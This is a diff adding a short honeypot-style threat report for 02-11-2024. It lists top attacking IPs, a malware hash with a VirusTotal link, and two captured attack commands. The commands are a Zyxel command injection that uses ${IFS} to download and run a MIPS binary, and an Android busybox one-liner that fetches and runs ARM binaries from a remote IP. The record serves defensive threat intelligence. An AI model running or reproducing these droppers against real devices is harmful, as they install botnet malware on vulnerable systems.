@@ -1,0 +1,19 @@
+Top 5 IPs for 02-11-2024 :
+
+104.168.83.104
+144.126.229.115
+117.209.86.175
+59.97.116.187
+103.200.84.199
+
+Malware Observed:
+
+File name : sshd
+9ac3924fa98c4788086eec79aad88a6e23d222f72cdf3a55d477cd87e9cb6402
+https://www.virustotal.com/gui/file/9ac3924fa98c4788086eec79aad88a6e23d222f72cdf3a55d477cd87e9cb6402
+
+Commands/exploits observed :
+
+/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.245.236.146/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
+
+cd /data/local/tmp/; rm *; busybox wget http://193.143.1.70/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://193.143.1.70/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://193.143.1.70/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://193.143.1.70/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android
